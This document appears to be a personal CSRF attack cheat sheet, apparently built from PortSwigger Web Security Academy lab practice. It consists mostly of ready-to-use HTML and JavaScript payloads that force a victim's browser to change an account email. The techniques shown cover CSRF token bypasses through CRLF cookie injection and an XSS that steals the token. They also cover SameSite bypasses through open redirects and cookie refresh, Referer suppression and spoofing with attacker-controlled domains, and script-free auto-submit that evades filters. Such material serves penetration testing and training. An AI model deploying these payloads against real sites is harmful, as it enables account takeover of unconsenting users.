---
created: 2026-07-07
tags:
  - client-side
  - web_hacking
  - cheatsheet
status: substantial
---



## CSRF no defenses

- `GET`-based:

```html
<img src="https://example.com/my-account/change-email?email=pwned%40example.com" width="0" height="0">
```

```html
<!-- link auto-clicked via JS -->
<a id="x" href="https://example.com/my-account/change-email?email=pwned%40example.com"></a>
<script>document.getElementById('x').click();</script>
```

- `POST`-based (auto-submit form):

```html
<form action="https://example.com/account/change-email" method="POST">
	<input type="hidden" name="email" value="pwned@email.com" />
</form>
<script>document.forms[0].submit();</script>
```

```html
<form action="https://example.com/my-account/change-email" method="POST" id="f">
	<input type="hidden" name="email" value="pwned@example.com">
</form>
<script>document.getElementById('f').submit()</script>
```

> [!note] URL-encode special characters in GET PoCs (`@` → `%40`, `&` → `%26`, space → `%20`).

## CSRF token bypass

### Validation depends on the HTTP method

- `GET` request bypass:

```html
<img src="https://example.com/my-account/change-email?email=pwned%40example.com&csrf=anything">
```

```html
<script>
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://example.com/example.com/my-account/change-email?email=pwned%40example.com&csrf=anything");
	xhr.send();
</script>
```

### Validation depends on the token being present

- Bypass with a form without a CSRF token parameter:

```html
<form action="https://example.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="pwned@example.com" />
</form>
<script>document.forms[0].submit();</script>
```

#### The token is not tied to the user's session

- Use your own valid, live token (keep your session active):

```html
<form action="https://example.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="pwned@example.com" />
	<input type="hidden" name="csrf" value="ATTACKER_OWN_VALID_TOKEN" />
</form>
<script>document.forms[0].submit();</script>
```

> [!warning] Testing requires two accounts, both with an active session at time of test. Logging out of the source account may invalidate its token before you can reuse it.

#### The token is tied to a non-session cookie

- Force the victim's browser to set the non-session cookie to the value from your account (such as by exploiting CRLF injection), then submit the form with your CSRF token:

```html
<html>
    <body>
        <form action="https://example.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@examaple.com" />
            <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
        </form>
        <img src="https://example.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_NON_SESSION_COOKIE%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

```html
<html>
    <body>
        <form action="https://0ac600a60477a7e982f743a00038002d.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@examaple.com" />
            <input type="hidden" name="csrf" value="I6DsiunuXmFkqpKtocyqg8VH9QcuI73m">
        </form>
        <img src="https://0ac600a60477a7e982f743a00038002d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=mfZCStj7Z79I8a6YoTkBSazBkMsMHm86%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

#### Double-submit cookie pattern

- Force the victim's browser to set the CSRF cookie to the value from your account (such as by exploiting CRLF injection), then submit the form with your CSRF token:

```html
<html>
	<img src="https://example.com/?search=test%0D%0ASet-Cookie:%20csrf=attacker123%3b%20SameSite=None">
    <body>
        <form action="https://0acd00b3037d876280f630c800f800f2.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned1@examaple.com" />
            <input type="hidden" name="csrf" value="attacker123">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

#### CSRF token bypass via XSS

- Steal CSRF token using [[XSS]]:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@example.com');
};
</script>
```

## Bypassing `SameSite` cookie protection

### Bypassing `SameSite=Lax` restrictions using `GET` requests

- `GET` / top-level navigation:

```html
<script>
	window.location = "https://example.com/my-account/change-email?email=pwned%40example.com"
</script>
```

- HTTP method override (works if the endpoint reads an override from a URL/body parameter, not a header):

```html
<script>
	window.location = "https://example.com/my-account/change-email?email=pwned%40example.com&_method=POST"
</script>
```

### Bypassing `SameSite` restrictions using on-site gadgets

>[!example]+ Example: Open redirect as a gadget
>
> - Suppose the target website, `example.com`, has a DOM-based open redirect:
> 
> ```JS
> let target = new URLSearchParams(location.search).get('url');
> window.location.href = target;
> ```
> 
> - If the application accepts `GET` on state-changing requests, even with `SameSite=Strict`, you can exploit CSRF by making the victim navigate to:
> 
> ```
> https://example.com/?url=https://example.com/my-account/change-email?email=pwned%40example.com
> ```
> 
> - The victim's browser is kept inside `example.com` the entire time; the state-changing request to `example.com` is triggered via a redirect from `example.com` — same-site.
> 
> - The exploit would look like:
> 
> ```html
> <script>
> 	window.location = "https://example.com/?url=https://example.com/my-account/change-email?email=pwned%40example.com"
> </script>
> ```

### Bypassing `SameSite` restrictions via vulnerable sibling domains


```javascript
fetch("https://example.com/my-account/change-email", {
  method: "POST",
  credentials: "include",
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: "email=pwned%40example.com"
});
```

### Bypassing `SameSite` Lax restrictions with newly issued cookies

- Exploiting `120`s grace window (needs a same-page gadget that renews the session cookie, e.g. a social-login/SSO redirect):

```html
<!-- step 1: force (or wait for) a cookie refresh on the target -->
<iframe src="https://example.com/refresh-session" style="display:none"></iframe>

<!-- step 2: immediately fire the forged POST while the cookie is still "new" -->
<form id="csrf" action="https://example.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@example.com">
</form>
<script>
  setTimeout(() => document.getElementById('csrf').submit(), 500);
</script>
```

## Bypassing `Referer`-based CSRF defenses
### Validation of `Referer` depends on header being present

- Suppress the `Referer` header in a state-changing cross-site request (add a [`Referer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy) meta tag to the exploit page):

```html
<meta name="referrer" content="no-referrer" />
```

```html
<html>
	<head>
		<!-- suppress Referer for all requests from this page -->
		<meta name="referrer" content="no-referrer" />
	</head>
    <body>
        <form action="https://example.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Validation of `Referer` can be circumvented

- Weak substring match:

```powershell
https://example.com.attacker.com    # resister a subdomain on your controlled domain
https://attacker.com/?example.com   # submit the domain as a URL parameter
https://attacker.com?%00example.com # null byte
```

>[!note] See [`URL validation bypass cheat sheet — PortSwigger Web Security Academy`](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet).

##  Auto-Submit Without `<script>` (CSP / filter evasion)

- Zero-JS (works even with JavaScript fully disabled; `GET` only):

```html
<meta http-equiv="refresh" content="0; url=https://example.com/my-account/change-email?email=pwned%40example.com">
```


- Inline event handler instead of `<script>` (JS must still be enabled; this only evades filters that strip `<script>` tags specifically, not a strict CSP without `unsafe-inline`, which blocks inline handlers too):

```html
<form action="https://example.com/my-account/change-email" method="POST" id="f">
  <input type="hidden" name="email" value="pwned@example.com">
  <input type="submit" value="Loading..." autofocus onfocus="document.getElementById('f').submit()">
</form>
```